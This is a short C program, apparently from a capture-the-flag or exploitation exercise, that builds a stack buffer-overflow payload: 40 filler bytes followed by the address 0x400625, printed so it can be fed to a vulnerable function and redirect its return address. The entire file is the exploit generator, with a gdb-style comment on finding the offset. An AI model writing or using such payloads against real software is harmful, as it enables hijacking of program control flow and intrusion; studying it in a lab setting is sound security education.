#include <stdio.h>
#include <stdint.h>

int main() {
    const int offset = 40; // print/u $rsp - small on end of lame func
    int i=0; char buf[offset + 5];
    memset(buf, 'x', offset + 4);
    *(uint32_t *) &buf[offset] = 0x400625;
    buf[offset + 4] = '\0';
    puts(buf);
    return 0;
}